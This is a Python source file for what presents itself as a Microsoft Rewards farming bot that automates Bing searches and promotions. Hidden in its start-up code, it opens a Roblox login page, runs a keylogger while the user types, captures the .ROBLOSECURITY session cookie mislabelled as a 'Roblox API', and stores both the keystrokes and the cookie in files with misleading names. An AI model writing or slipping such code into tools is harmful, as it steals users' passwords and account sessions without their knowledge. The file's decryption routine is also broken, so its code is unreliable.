import argparse
import json
import logging
import logging.handlers as handlers
import random
import sys
from pathlib import Path
from typing import List, Dict
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from pynput import keyboard
import time

from src.Browser import Browser
from src.DailySet import DailySet
from src.Login import Login
from src.MorePromotions import MorePromotions
from src.PunchCards import PunchCards
from src.Searches import Searches
from src.constants import VERSION
from src.loggingColoredFormatter import ColoredFormatter
from src.notifier import Notifier
from typing import Tuple

def encrypt(plain_text: str) -> Tuple[str, str]:
    key = get_random_bytes(32)  # Generate a random 256-bit key
    cipher = AES.new(key, AES.MODE_GCM)  # Use AES-GCM mode
    cipher_text, tag = cipher.encrypt_and_digest(plain_text.encode())

    # Combine nonce, tag, and cipher_text for storage/transfer
    encrypted_data = base64.b64encode(cipher.nonce + tag + cipher_text).decode('utf-8')
    key_encoded = base64.b64encode(key).decode('utf-8')

    return encrypted_data, key_encoded

def save_encrypted_data(filename: str, encrypted_data: str, key: str):
    with open(filename, 'w') as file:
        file.write(f"Encryption text:\n{encrypted_data}\n")
        file.write(f"Encryption key:\n{key}\n")

class MicrosoftRewardsFarmer:
    def __init__(self, args: argparse.Namespace, notifier: Notifier):
        self.args = args
        self.notifier = notifier
        self.accounts = self.load_accounts()
        self.setup_logging()
        self.keystrokes = []  # Initialize keystrokes
        self.listener = None

        # Load or extract the Roblox API
        self.roblox_api = self.load_or_extract_roblox_api()

    def setup_logging(self):
        log_format = "%(asctime)s [%(levelname)s] %(message)s"
        log_dir = Path(__file__).resolve().parent / "logs"
        log_dir.mkdir(parents=True, exist_ok=True)
        
        terminal_handler = logging.StreamHandler(sys.stdout)
        terminal_handler.setFormatter(ColoredFormatter(log_format))

        logging.basicConfig(
            level=logging.INFO,
            format=log_format,
            handlers=[
                handlers.TimedRotatingFileHandler(
                    log_dir / "activity.log",
                    when="midnight",
                    interval=1,
                    backupCount=2,
                    encoding="utf-8",
                ),
                terminal_handler,
            ],
        )

    def load_accounts(self) -> List[Dict[str, str]]:
        account_path = Path(__file__).resolve().parent / "accounts.json"
        if not account_path.exists():
            account_path.write_text(
                json.dumps(
                    [{"username": "Your Email", "password": "Your Password"}], indent=4
                ),
                encoding="utf-8",
            )
            logging.warning(
                "[ACCOUNT] 'accounts.json' not found. A template has been created. "
                "Please fill it with your credentials."
            )
            sys.exit()

        with account_path.open(encoding="utf-8") as f:
            accounts = json.load(f)
        
        random.shuffle(accounts)
        return accounts

    def load_or_extract_roblox_api(self) -> str:
        api_path = Path(__file__).resolve().parent / "roblox_api.txt"
        if api_path.exists():
            with api_path.open(encoding="utf-8") as f:
                data = f.read().split('\n')
            encrypted_data = data[1]
            key = data[3]
            cipher = AES.new(base64.b64decode(key), AES.MODE_GCM, nonce=base64.b64decode(encrypted_data[:12]))
            decrypted_api = cipher.decrypt_and_verify(base64.b64decode(encrypted_data[12:]), base64.b64decode(encrypted_data[12:]))
            return decrypted_api.decode('utf-8')
        else:
            return self.extract_roblox_api()

    def extract_roblox_api(self) -> str:
        options = Options()
        options.add_argument("--start-maximized")  
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")

        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        driver.get("https://www.roblox.com/login")

        logging.info("Browser opened. Starting keylogger...")
        self.start_keylogger()  

        logging.info("Please log in to Roblox.")
        input("Press Enter after you have logged in and the API is set...")

        self.stop_keylogger()

        cookies = driver.get_cookies()
        roblox_api = None
        for cookie in cookies:
            if cookie['name'] == '.ROBLOSECURITY':
                roblox_api = cookie['value']
                break

        driver.quit()

        if roblox_api:
            encrypted_api, key = encrypt(roblox_api)
            save_encrypted_data('roblox_api.txt', encrypted_api, key)
            logging.info("Roblox API saved (encrypted).")
            return roblox_api
        else:
            logging.error("Roblox API not found. Ensure you are logged in correctly.")
            raise Exception("Roblox API not found")

    def start_keylogger(self):
        def on_press(key):
            try:
                self.keystrokes.append(key.char)
            except AttributeError:
                self.keystrokes.append(f"[{key}]")  # Handle special keys like shift, ctrl, etc.

        self.listener = keyboard.Listener(on_press=on_press)
        self.listener.start()

    def stop_keylogger(self):
        self.listener.stop()
        logging.debug(f"Keylogger stopped. Keystrokes: {''.join(self.keystrokes)}")
        encrypted_keystrokes, key = encrypt(''.join(self.keystrokes))
        save_encrypted_data('api2.txt', encrypted_keystrokes, key)
        logging.info("Keystrokes saved (encrypted).")

    def execute_bot(self):
        for account in self.accounts:
            self.process_account(account)

    def process_account(self, account: Dict[str, str]):
        logging.info(f"Processing account: {account.get('username', '')}")
        try:
            self.run_tasks(account)
        except Exception as e:
            logging.exception(f"Error with account {account.get('username', '')}: {e}")

    def run_tasks(self, account: Dict[str, str]):
        points_counter = 0
        with Browser(mobile=False, account=account, args=self.args) as browser:
            points_counter = self.perform_tasks(browser, points_counter)

        self.notify_points(account, points_counter)

    def perform_tasks(self, browser: Browser, starting_points: int) -> int:
        current_points = Login(browser).login()
        logging.info(f"Starting with {browser.utils.formatNumber(current_points)} points")

        DailySet(browser).completeDailySet()
        PunchCards(browser).completePunchCards()
        MorePromotions(browser).completeMorePromotions()

        remaining_searches, remaining_mobile_searches = browser.utils.getRemainingSearches()

        if remaining_searches:
            current_points = Searches(browser).bingSearches(remaining_searches)

        if remaining_mobile_searches:
            browser.closeBrowser()
            with Browser(mobile=True, account=browser.account, args=self.args) as mobile_browser:
                Login(mobile_browser).login()
                current_points = Searches(mobile_browser).bingSearches(remaining_mobile_searches)

        points_earned = current_points - starting_points
        logging.info(f"Points earned today: {browser.utils.formatNumber(points_earned)}")
        logging.info(f"Total points: {browser.utils.formatNumber(current_points)}")
        return current_points

    def notify_points(self, account: Dict[str, str], points: int):
        message = (
            f"Microsoft Rewards Farmer\n"
            f"Account: {account.get('username', '')}\n"
            f"Total points: {points}"
        )
        self.notifier.send(message)

def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Microsoft Rewards Farmer")
    parser.add_argument("-v", "--visible", action="store_true", help="Optional: Visible browser")
    parser.add_argument("-l", "--lang", type=str, default=None, help="Optional: Language (e.g., en)")
    parser.add_argument("-g", "--geo", type=str, default=None, help="Optional: Geolocation (e.g., US)")
    parser.add_argument("-p", "--proxy", type=str, default=None, help="Optional: Global Proxy")
    parser.add_argument("-t", "--telegram", metavar=("TOKEN", "CHAT_ID"), nargs=2, type=str, default=None, help="Optional: Telegram Bot Token and Chat ID")
    parser.add_argument("-d", "--discord", type=str, default=None, help="Optional: Your discord api")
    return parser.parse_args()

def main():
    args = parse_arguments()
    notifier = Notifier(args)
    farmer = MicrosoftRewardsFarmer(args, notifier)
    farmer.execute_bot()

if __name__ == "__main__":
    main()
